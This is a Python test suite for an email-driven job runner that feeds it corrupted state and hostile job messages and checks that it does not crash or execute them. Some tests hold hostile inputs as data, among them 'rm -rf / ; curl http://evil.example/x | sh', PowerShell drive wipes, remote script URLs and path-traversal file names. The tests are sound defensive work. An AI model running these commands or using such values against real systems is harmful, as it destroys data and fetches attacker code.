#!/usr/bin/env python3
"""Negative cases from a working extension simulation.

The Oracle shares one poll with the board, the reviewer, the resource
monitor, the senses, and the DRI pager. The simulation wrote garbage
into those stores (a board file that was a JSON list, a numeric
capability list, a DRI cursor that was a word, a resource sample that
was a string, a sense record whose detail was the desktop flag) and
the poll raised. These tests are those inputs.
"""
import io
import json
import os
import sys
import tempfile
import time
import unittest
from contextlib import redirect_stdout
from datetime import datetime, timezone
from email.message import EmailMessage
from unittest import mock

REPO = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, REPO)

from runner import dri, resources, review  # noqa: E402
from runner.runner import (  # noqa: E402
    _redact_patterns,
    answer_queries,
    poll_once,
    query_budget,
    run_inspect,
    sign_payload,
)

SECRET = "c4e8b1a97d2f6053e8a1c7b9e2f4d8065a3c8e1b7d9f2a4c6e8b1d3f5a7c9e2b4d"
FLAG = "FLAG-CRED-9f3c2a7e1b"


def _now():
    return datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")


def _mail(subject, body):
    msg = EmailMessage()
    msg["Subject"] = subject
    msg["From"] = "si@example.com"
    msg.set_content(body)
    return msg.as_bytes()


class _IMAP:
    def __init__(self, raw):
        self.raw = raw

    def search(self, *args):
        return "OK", [b"1"]

    def fetch(self, num, what):
        return "OK", [(b"1 (RFC822)", self.raw)]

    def store(self, *args, **kwargs):
        return "OK", []


class _SMTP:
    def sendmail(self, *args, **kwargs):
        return None


class _Opts:
    dry_run = False
    no_send = True


class ExtensionPoisonTest(unittest.TestCase):
    def test_list_board_and_numeric_capabilities_do_not_crash_the_poll(self):
        with tempfile.TemporaryDirectory() as d:
            with open(os.path.join(d, "board.json"), "w", encoding="utf-8") as fh:
                json.dump(["not", "a", "board"], fh)
            body = sign_payload({
                "v": 1, "type": "task_request", "issued_at": _now(),
                "capabilities": 5,
            }, SECRET)
            raw = _mail("[HOMING-PIGEON] task_request worker-1", body)
            cfg = {
                "mailbox_user": "pigeon-test@example.com",
                "shared_secret": SECRET,
                "worker_compartments": {"worker-1": 5},
                "require_review": True,
                "dag_mode": "enforce",
            }
            poll_once(cfg, d, {}, os.path.join(d, "seen.json"),
                      imap=_IMAP(raw), smtp=_SMTP(), opts=_Opts())

    def test_review_accepts_a_job_whose_fields_are_the_wrong_type(self):
        notes = review.review_job({
            "review_patterns_extra": [{
                "id": "kf-flag",
                "pattern": "FLAG-CRED",
                "note": "script names the desktop flag",
                "severity": "warn",
            }],
        }, {
            "kind": "ping",
            "script": {"not": "text"},
            "files": "not-a-list",
            "interpreter": "bash",
            "timeout_sec": {"too": "big"},
        })
        self.assertIn("notes", notes)
        self.assertNotIn(FLAG, json.dumps(notes))

    def test_poisoned_dri_and_resource_state_do_not_raise(self):
        with tempfile.TemporaryDirectory() as d:
            with open(os.path.join(d, "dri-state.json"), "w", encoding="utf-8") as fh:
                json.dump({
                    "last_check": "not-a-time",
                    "last_page": {"key_probe": "never"},
                    "pending_digest": "nope",
                }, fh)
            with open(os.path.join(d, "resources.json"), "w", encoding="utf-8") as fh:
                json.dump({
                    "last_alert": {"disk": "yesterday", "cpu": []},
                    "cpu_prev": "nope",
                }, fh)
            with open(os.path.join(d, "security-events.jsonl"), "w", encoding="utf-8") as fh:
                fh.write("not json\n")
                fh.write(json.dumps({
                    "type": "resource_pressure",
                    "at": _now(),
                    "threshold": "high",
                    "resources": {"disk": "full", "cpu": None},
                }) + "\n")
            cfg = {
                "resources": {"enabled": True, "threshold": 0.0, "cooldown_sec": 0},
                "dri": {
                    "enabled": True,
                    "channel": "telegram",
                    "triggers": {
                        "resource_pressure": True,
                        "key_probe": {"threshold": 1, "window_sec": 3600},
                        "sensor_fused_score": {"threshold": 0.1, "window_sec": 3600},
                    },
                    "cooldown_sec": 0,
                    "digest_window_sec": 0,
                },
            }
            event = resources.check_resources(cfg, d)
            self.assertTrue(event is None or event.get("type") == "resource_pressure")
            with mock.patch.object(dri, "_send", return_value=False):
                # Bad cursor is a first run. The next cycle reads the
                # poisoned event and must still return, not raise.
                self.assertEqual(dri.maybe_page(cfg, d), 0)
                dri.maybe_page(cfg, d)
            with open(os.path.join(d, "dri-state.json"), encoding="utf-8") as fh:
                state = json.load(fh)
            self.assertIsInstance(state.get("last_check"), float)

    def test_senses_answer_redacts_a_string_detail(self):
        with tempfile.TemporaryDirectory() as d:
            with open(os.path.join(d, "senses.jsonl"), "w", encoding="utf-8") as fh:
                fh.write(json.dumps([1, 2, 3]) + "\n")
                fh.write(json.dumps({
                    "sensor": "host_ids",
                    "severity": {"bad": True},
                    "title": {"not": "a string"},
                    "weight": "lots",
                    "detail": FLAG,
                    "received_at": _now(),
                }) + "\n")
            cfg = {"redact_patterns_extra": {"flag": r"FLAG-CRED-[0-9a-f]{10}"}}
            answers, spent = answer_queries(
                [{"op": "senses", "sensor": 1, "limit": "many"}],
                {"stdout": "", "stderr": "", "exit_code": 0},
                _redact_patterns(cfg),
                budget=2,
                cfg=cfg,
                view="attested",
                base_dir=d,
            )
        blob = json.dumps(answers)
        self.assertEqual(spent, 1)
        self.assertNotIn(FLAG, blob)
        self.assertIn("[REDACTED:flag]", blob)
        self.assertEqual(answers[0]["op"], "senses")


class MistypedConfigTest(unittest.TestCase):
    """Second simulation: the config and the job shape were the wrong types.

    output_retention_days was the word "week", protected_paths was the
    number 5, workspace_root was the number 5, and the job's
    result_policy was the string "attested". The retention word killed
    the poll before mail was read. The number 5 killed the job after
    the ping ran, and the runner scheduled it to run again.
    """

    def test_mistyped_retention_and_paths_do_not_retry_the_job(self):
        with tempfile.TemporaryDirectory() as d:
            body = sign_payload({
                "v": 1, "type": "job", "job_id": "job-shape",
                "issued_at": _now(), "kind": "ping",
                "result_policy": "attested",
            }, SECRET)
            raw = _mail("[HOMING-PIGEON] job job-shape", body)
            cfg = {
                "mailbox_user": "pigeon-test@example.com",
                "shared_secret": SECRET,
                "output_retention_days": "week",
                "max_query_budget": "eight",
                "protected_paths": 5,
                "workspace_root": 5,
                "judge": "off",
            }
            seen = {}
            poll_once(cfg, d, seen, os.path.join(d, "seen.json"),
                      imap=_IMAP(raw), smtp=_SMTP(), opts=_Opts())
            self.assertIn("job-shape", seen)
            self.assertEqual(query_budget(cfg, {"result_policy": "attested"}), 8)


class PoisonedQueryTest(unittest.TestCase):
    """Third simulation: a follow-up query, not a question to the Oracle.

    The rate-limit file was a JSON list. The cap was the word "lots".
    The retained job had stdout 5, stderr null, a budget of "eight",
    and a view of 3. The query body mixed a string, a bad grep, a
    tail, and a senses op whose sensor was a number.
    """

    def _query(self, d):
        os.makedirs(os.path.join(d, "retained"))
        with open(os.path.join(d, "query_times.json"), "w", encoding="utf-8") as fh:
            json.dump([1, 2, "nope"], fh)
        with open(os.path.join(d, "retained", "job-q.json"), "w", encoding="utf-8") as fh:
            json.dump({
                "stdout": 5, "stderr": None, "spent": "many",
                "budget": "eight", "patterns": ["not", "a", "dict"],
                "view": 3, "saved_at": time.time(),
            }, fh)
        body = sign_payload({
            "v": 1, "type": "query", "query_id": "q1", "job_id": "job-q",
            "issued_at": _now(),
            "queries": [
                "not-an-object",
                {"op": "grep", "pattern": "("},
                {"op": "tail"},
                {"op": "senses", "sensor": 1},
            ],
        }, SECRET)
        return _mail("[HOMING-PIGEON] query q1", body)

    def test_word_cap_and_list_store_do_not_crash(self):
        with tempfile.TemporaryDirectory() as d:
            cfg = {
                "mailbox_user": "pigeon-test@example.com",
                "shared_secret": SECRET,
                "max_queries_per_hour": "lots",
                "max_query_budget": "eight",
                "base_dir": d,
            }
            seen = {}
            poll_once(cfg, d, seen, os.path.join(d, "seen.json"),
                      imap=_IMAP(self._query(d)), smtp=_SMTP(), opts=_Opts())
            self.assertIn("query:q1", seen)

            class Args:
                inspect = "budget"
                job_id = None

            buf = io.StringIO()
            with redirect_stdout(buf):
                self.assertEqual(run_inspect(cfg, Args()), 0)
            self.assertNotIn("Traceback", buf.getvalue())

    def test_poisoned_retained_output_still_answers(self):
        with tempfile.TemporaryDirectory() as d:
            cfg = {
                "mailbox_user": "pigeon-test@example.com",
                "shared_secret": SECRET,
                "max_queries_per_hour": 0,
                "max_query_budget": "eight",
            }
            seen = {}
            poll_once(cfg, d, seen, os.path.join(d, "seen.json"),
                      imap=_IMAP(self._query(d)), smtp=_SMTP(), opts=_Opts())
            self.assertIn("query:q1", seen)


class NumericBoardTaskTest(unittest.TestCase):
    """Fifth simulation: a board submit, not a question.

    task_id was the number 5, priority was the word high, requires
    was a script name, and capabilities was an object. The number
    reached re.fullmatch and the worker raised TypeError.
    """

    def test_numeric_task_id_is_rejected_without_a_crash(self):
        from runner.runner import Board
        with tempfile.TemporaryDirectory() as d:
            board = Board(os.path.join(d, "board.json"))
            ok, reason = board.submit({
                "task_id": 5,
                "priority": "high",
                "requires": "setup.sh",
                "capabilities": {"shell": True},
                "payload": {"detail": FLAG},
            })
            self.assertFalse(ok)
            self.assertEqual(reason, "invalid task_id")
            ok, reason = board.submit(["not", "a", "task"])
            self.assertFalse(ok)
            self.assertEqual(reason, "invalid task")
            self.assertEqual(board.tasks, {})

            body = sign_payload({
                "v": 1, "type": "task_submit", "issued_at": _now(),
                "task_id": 5,
                "priority": "high",
                "requires": "setup.sh",
                "capabilities": {"shell": True},
                "payload": {"detail": FLAG},
            }, SECRET)
            raw = _mail("[HOMING-PIGEON] task_submit board-1", body)
            cfg = {
                "mailbox_user": "pigeon-test@example.com",
                "shared_secret": SECRET,
                "require_review": True,
            }
            poll_once(cfg, d, {}, os.path.join(d, "seen.json"),
                      imap=_IMAP(raw), smtp=_SMTP(), opts=_Opts())
            self.assertFalse(os.path.exists(os.path.join(d, "work")))
            path = os.path.join(d, "board.json")
            if os.path.exists(path):
                with open(path, encoding="utf-8") as fh:
                    stored = json.load(fh)
                self.assertNotIn("5", stored)
                self.assertNotIn(FLAG, json.dumps(stored))


if __name__ == "__main__":
    unittest.main(verbosity=2)


class SensorCostumeTest(unittest.TestCase):
    """A sensor alert that is trying to be an exec job.

    It carries a script, a non-https script_url, a sensor name that
    walks out of the store, and a detail that is the desktop flag.
    The Oracle must reject it, never execute it, and not crash.
    """

    def test_sensor_alert_wearing_an_exec_costume_does_not_run(self):
        with tempfile.TemporaryDirectory() as d:
            outside = os.path.join(d, "outside")
            os.makedirs(outside)
            marker = os.path.join(outside, "ran")
            job = {
                "v": 1, "type": "job", "kind": "sensor_alert",
                "job_id": "costume-1", "issued_at": _now(),
                "sensor": "../outside",
                "severity": "critical",
                "title": "rm -rf / ; curl http://evil.example/x | sh",
                "detail": FLAG,
                "script": f"import pathlib; pathlib.Path({marker!r}).write_text('ran')",
                "script_url": "http://evil.example/payload",
                "files": [{"name": "../outside/planted", "content": "x"}],
            }
            raw = _mail("[HOMING-PIGEON] job costume-1",
                        sign_payload(job, SECRET))
            cfg = {
                "mailbox_user": "pigeon-test@example.com",
                "shared_secret": SECRET,
                "base_dir": d,
                "sensors": {"host-ids": {"enabled": True, "key_id": "sense"}},
                "judge": "enforce",
            }
            poll_once(cfg, d, {}, os.path.join(d, "seen.json"),
                      imap=_IMAP(raw), smtp=_SMTP(), opts=_Opts())
            self.assertFalse(os.path.exists(marker))
            self.assertFalse(os.path.exists(os.path.join(outside, "planted")))
            store = os.path.join(d, "senses.jsonl")
            if os.path.exists(store):
                self.assertNotIn(FLAG, open(store, encoding="utf-8").read())

    def test_senses_query_survives_a_corrupt_store(self):
        with tempfile.TemporaryDirectory() as d:
            path = os.path.join(d, "senses.jsonl")
            with open(path, "w", encoding="utf-8") as fh:
                fh.write('{"sensor":"host-ids","severity":"high",'
                         f'"title":"ok","detail":"{FLAG}"}}\n')
                fh.write("not json at all\n")
                fh.write("42\n")
                fh.write('{"sensor":"host-ids","severity":["high"],'
                         '"title":1,"detail":{"nested":true}}\n')
            answers, spent = answer_queries(
                [{"op": "senses", "sensor": "../outside", "limit": -1}],
                {"stdout": "", "stderr": "", "exit_code": 0},
                _redact_patterns({}), query_budget({}, {}),
                cfg={"sensors": {"host-ids": {"enabled": True, "key_id": "s"}}},
                base_dir=d,
            )
            self.assertEqual(spent, 1)
            blob = json.dumps(answers)
            self.assertNotIn(FLAG, blob)
            self.assertNotIn("Traceback", blob)

    def test_extensions_do_not_crash_on_one_poll(self):
        with tempfile.TemporaryDirectory() as d:
            review.review_job({"review_patterns_extra": "nope"},
                              {"kind": "sensor_alert", "script": None})
            resources.check_resources(
                {"resources": {"enabled": True, "cpu_high": "hot"}}, d)
            dri.maybe_page(
                {"dri": {"enabled": True, "bot_token": FLAG, "chat_id": 5}}, d)
            self.assertFalse(os.path.exists(os.path.join(d, "work")))


class WindowsExtensionTest(unittest.TestCase):
    """Same poison, on a simulated Windows box.

    os.name is nt. The interpreter is PowerShell. Paths use
    backslashes. winlog is the extension that only exists here.
    None of it may crash the Oracle, and none of it may run.
    """

    def test_powershell_costume_does_not_run_on_windows(self):
        with tempfile.TemporaryDirectory() as d:
            outside = os.path.join(d, "outside")
            os.makedirs(outside)
            marker = os.path.join(outside, "ran")
            job = {
                "v": 1, "type": "job", "kind": "sensor_alert",
                "job_id": "win-costume-1", "issued_at": _now(),
                "sensor": "..\\..\\Windows\\System32",
                "severity": "critical",
                "title": "Remove-Item -Recurse -Force C:\\",
                "detail": {"note": FLAG, "path": "C:\\Users\\Public\\flag"},
                "script": f"Set-Content -Path '{marker}' -Value ran",
                "interpreter": ["powershell", "-File"],
                "script_url": "http://evil.example/p.ps1",
            }
            raw = _mail("[HOMING-PIGEON] job win-costume-1",
                        sign_payload(job, SECRET))
            cfg = {
                "mailbox_user": "pigeon-test@example.com",
                "shared_secret": SECRET,
                "base_dir": d,
                "sensors": {"host-ids": {"enabled": True, "key_id": "sense"}},
                "judge": "enforce",
            }
            with mock.patch("runner.runner.os.name", "nt"), \
                 mock.patch("runner.runner.sys.platform", "win32"):
                poll_once(cfg, d, {}, os.path.join(d, "seen.json"),
                          imap=_IMAP(raw), smtp=_SMTP(), opts=_Opts())
            self.assertFalse(os.path.exists(marker))
            store = os.path.join(d, "senses.jsonl")
            if os.path.exists(store):
                self.assertNotIn(FLAG, open(store, encoding="utf-8").read())

    def test_winlog_swallows_a_broken_event_log(self):
        from runner import winlog
        with mock.patch("runner.winlog.os.name", "nt"):
            with mock.patch.dict("sys.modules", {"ctypes": None}):
                winlog.report_event(FLAG)
                winlog.report_event(None)
                winlog.report_event("x" * 100000)
        self.assertTrue(True)

    def test_windows_extensions_share_one_poll(self):
        with tempfile.TemporaryDirectory() as d:
            with open(os.path.join(d, "board.json"), "w", encoding="utf-8") as fh:
                json.dump({"t": {"state": "open", "requires": "not-a-list"}}, fh)
            with mock.patch("runner.runner.os.name", "nt"):
                review.review_job({}, {"kind": "exec", "script": FLAG,
                                       "interpreter": ["powershell", "-File"]})
                resources.check_resources({"resources": True}, d)
                dri.maybe_page({"dri": {"enabled": True, "chat_id": "..\\x"}}, d)
                body = sign_payload({
                    "v": 1, "type": "task_request", "issued_at": _now(),
                    "capabilities": ["powershell"],
                }, SECRET)
                raw = _mail("[HOMING-PIGEON] task_request worker-1", body)
                cfg = {
                    "mailbox_user": "pigeon-test@example.com",
                    "shared_secret": SECRET,
                    "worker_allowlist": ["worker-1"],
                }
                poll_once(cfg, d, {}, os.path.join(d, "seen.json"),
                          imap=_IMAP(raw), smtp=_SMTP(), opts=_Opts())


class WindowsReservedNameTest(unittest.TestCase):
    """Windows device names and a DRI page, on a simulated nt box.

    CON, NUL, and a trailing dot are reserved or rewritten on Windows.
    A pager that fires from a poisoned event log must not crash, and
    must not be the thing that runs a job.
    """

    def test_reserved_names_do_not_escape_or_crash(self):
        from runner.runner import execute_job
        with tempfile.TemporaryDirectory() as d:
            job = {
                "v": 1, "type": "job", "kind": "exec", "job_id": "win-names",
                "script": FLAG,
                "interpreter": ["powershell", "-NoProfile", "-File"],
                "files": [
                    {"name": "CON", "url": "https://example.invalid/con"},
                    {"name": "NUL", "url": "https://example.invalid/nul"},
                    {"name": "..\\\\..\\\\Windows\\\\System32\\\\x", "url": "https://example.invalid/x"},
                    {"name": "note.txt.", "url": "https://example.invalid/dot"},
                ],
            }
            cfg = {"base_dir": d, "default_timeout_sec": 5}
            with mock.patch("runner.runner.os.name", "nt"), \
                 mock.patch("runner.runner.download", side_effect=RuntimeError("no net")), \
                 mock.patch("runner.runner.subprocess.Popen") as popen:
                try:
                    execute_job(cfg, job, d)
                except Exception as e:
                    self.assertNotIsInstance(e, (SystemExit, KeyboardInterrupt))
                popen.assert_not_called()
            work = os.path.join(d, "work")
            if os.path.isdir(work):
                for root, dirs, files in os.walk(work):
                    for name in files:
                        self.assertNotIn(FLAG, open(os.path.join(root, name),
                                                    encoding="utf-8", errors="replace").read())

    def test_dri_page_from_a_poisoned_event_does_not_crash(self):
        with tempfile.TemporaryDirectory() as d:
            now = datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")
            with open(os.path.join(d, "security-events.jsonl"), "w", encoding="utf-8") as fh:
                fh.write(json.dumps({
                    "type": "confinement_violation", "at": now,
                    "detail": FLAG, "title": "CON",
                }) + "\n")
                fh.write("not-json\n")
                fh.write("null\n")
            cfg = {"dri": {
                "enabled": True, "channel": "telegram",
                "telegram_bot_token": "t", "telegram_chat_id": "1",
                "triggers": {"confinement_violation": {"enabled": True}},
                "cooldown_sec": 0,
            }}
            sent = {}

            def grab(token, chat, text):
                sent["text"] = text
                return True

            with mock.patch("runner.runner.os.name", "nt"), \
                 mock.patch("runner.dri.send_telegram", side_effect=grab):
                dri.maybe_page(cfg, d)
            self.assertNotIn("Traceback", sent.get("text", ""))

    def test_kill_tree_on_windows_survives_a_dead_pid(self):
        from runner.runner import kill_tree
        proc = mock.Mock()
        proc.pid = -1
        proc.kill.side_effect = OSError("already dead")
        with mock.patch("runner.runner.os.name", "nt"), \
             mock.patch("runner.runner.subprocess.run", side_effect=FileNotFoundError("taskkill")):
            kill_tree(proc)


class WindowsEnvAndReviewTest(unittest.TestCase):
    """Windows folds env keys and ignores shebangs.

    A job that smuggles pigeon_secret must lose it. A bash shebang
    reviewed on nt must be noted, not crash. The resource monitor
    has no /proc on Windows and must still return.
    """

    def test_env_scrub_is_case_insensitive(self):
        from runner.runner import _scrub_env
        env = {
            "PIGEON_SECRET": FLAG,
            "pigeon_secret": FLAG,
            "Pigeon_Token": FLAG,
            "PATH": "C:\\\\Windows\\\\System32",
        }
        with mock.patch("runner.runner.os.name", "nt"):
            clean = _scrub_env(env)
        self.assertNotIn("PIGEON_SECRET", clean)
        self.assertNotIn("pigeon_secret", clean)
        self.assertNotIn("Pigeon_Token", clean)
        self.assertIn("PATH", clean)
        self.assertNotIn(FLAG, json.dumps(clean))

    def test_ads_name_and_bash_shebang_do_not_crash(self):
        from runner.runner import execute_job
        with tempfile.TemporaryDirectory() as d:
            job = {
                "kind": "exec", "job_id": "ads-1",
                "script": "#!/bin/bash\\n" + FLAG,
                "interpreter": ["powershell", "-NoProfile", "-File"],
                "files": [{"name": "report.ps1:hidden", "url": "https://example.invalid/ads"}],
            }
            with mock.patch("runner.runner.os.name", "nt"), \
                 mock.patch("runner.runner.download", side_effect=RuntimeError("no net")), \
                 mock.patch("runner.runner.subprocess.Popen") as popen:
                try:
                    execute_job({"base_dir": d}, job, d)
                except Exception as e:
                    self.assertNotIsInstance(e, (SystemExit, KeyboardInterrupt))
                popen.assert_not_called()
            notes = review.review_job({}, {
                "kind": "exec", "script": "#!/bin/bash\\necho hi",
                "interpreter": ["powershell", "-File"],
            })
            with mock.patch("runner.review.os.name", "nt"):
                notes = review.review_job({}, {
                    "kind": "exec", "script": "#!/bin/bash\\necho hi",
                })
            ids = [n.get("id") for n in notes.get("notes", [])]
            self.assertIn("shebang_platform_mismatch", ids)

    def test_resources_on_windows_with_a_poisoned_state(self):
        with tempfile.TemporaryDirectory() as d:
            with open(os.path.join(d, "resources-state.json"), "w", encoding="utf-8") as fh:
                fh.write('{"prev": "not-a-sample", "cpu": "hot"}')
            with mock.patch("runner.runner.os.name", "nt"):
                resources.check_resources(
                    {"resources": {"enabled": True, "disk_path": "CON"}}, d)
